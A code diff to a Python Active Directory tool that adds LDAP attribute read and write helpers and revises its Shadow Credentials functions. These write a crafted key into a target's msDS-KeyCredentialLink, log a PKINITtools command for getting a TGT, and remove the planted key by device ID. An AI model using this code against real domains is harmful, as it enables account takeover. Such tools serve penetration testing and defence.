@@ -3,6 +3,7 @@ import string
 import ldap3
 import impacket
 import logging
+import json
 from ldap3.protocol.formatters.formatters import format_sid
 from impacket.ldap import ldaptypes
 from impacket.dcerpc.v5 import samr, dtypes
@@ -10,6 +11,7 @@ from dsinternals.system.Guid import Guid
 from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from dsinternals.common.data import DNWithBinary
 
 from .exceptions import NoResultError, ResultError, TooManyResultsError
 from .formatters import ACCESS_FLAGS, ACE_FLAGS
@@ -106,6 +108,42 @@ def resolvDN(conn, identity, objtype=None):
     res = entries[0]['dn']
     return res
 
+def getObjAttr(conn, identity, attr='*', fetchSD="False", isLog=False):
+    """
+    Fetch LDAP attributes for the identity (group or user) provided
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target
+        attr: attributes to fetch separated with ',' (default fetch all attributes)
+        fetchSD: True fetch nTSecurityDescriptor that contains DACL (default is False)
+    """
+    ldap_conn = conn.getLdapConnection()
+    dn = resolvDN(ldap_conn, identity)
+    control_flag = 0
+    if fetchSD == "True":
+        # If SACL is asked the server will not return the nTSecurityDescriptor for a standard user because it needs privileges
+        control_flag = dtypes.OWNER_SECURITY_INFORMATION + dtypes.GROUP_SECURITY_INFORMATION + dtypes.DACL_SECURITY_INFORMATION
+    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=control_flag)
+    ldap_conn.search(dn, "(objectClass=*)", search_scope=ldap3.BASE, attributes=attr.split(','), controls=controls)
+    if isLog:
+        print(json.dumps(json.loads(conn.getLdapConnection().response_to_json())['entries'][0]['attributes'], indent=4, sort_keys=True))
+    return ldap_conn.response[0]
+
+def setAttr(conn, identity, attribute, value):
+    """
+    Add or replace an attribute of an object
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the object
+        attribute: Name of the attribute 
+        value: jSON array (e.g ["john.doe"])
+    """
+    ldap_conn = conn.getLdapConnection()
+    dn = resolvDN(ldap_conn, identity)
+    ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]})
+
+    if ldap_conn.result['result'] == 0:
+        LOG.info(f"{attribute} set successfully")
+    else:
+        raise ResultError(conn.result)
 
 def getDefaultNamingContext(conn):
     naming_context = conn.server.info.other['defaultNamingContext'][0]
@@ -254,7 +292,6 @@ def addShadowCredentials(conn, identity, outfilePath=None):
     ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
 
     new_values = ldap_conn.response[0]['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
-    LOG.debug(new_values)
     LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
     ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
     
@@ -271,24 +308,26 @@ def addShadowCredentials(conn, identity, outfilePath=None):
         LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
         LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
         LOG.info("Run the following command to obtain a TGT")
-        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))
+        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, conn.conf.domain, identity, path))
 
     else:
         raise ResultError(ldap_conn.result)
 
 
-def delShadowCredentials(conn, identity):
+def delShadowCredentials(conn, identity, deviceID):
     """
     Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
     Args:
         identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
     """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, identity)
+    attr = 'msDS-KeyCredentialLink'
+    keyCreds = getObjAttr(conn, identity)['raw_attributes'][attr]
+    newKeyCreds = []
+    for keyCred in keyCreds:    
+        dnBin = DNWithBinary.DNWithBinary.fromRawDNWithBinary(keyCred)
+        if deviceID and KeyCredential.fromDNWithBinary(dnBin).DeviceId.toFormatD() != deviceID:
+            newKeyCreds.append(keyCred)
+        else:
+            LOG.info("[*] Key to delete found")
 
-    # TODO: remove only the public key corresponding to the certificate provided
-    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
-    if ldap_conn.result['result'] == 0:
-        LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
-    else:
-        raise ResultError(ldap_conn.result)
+    setAttr(conn, identity, attr, newKeyCreds)
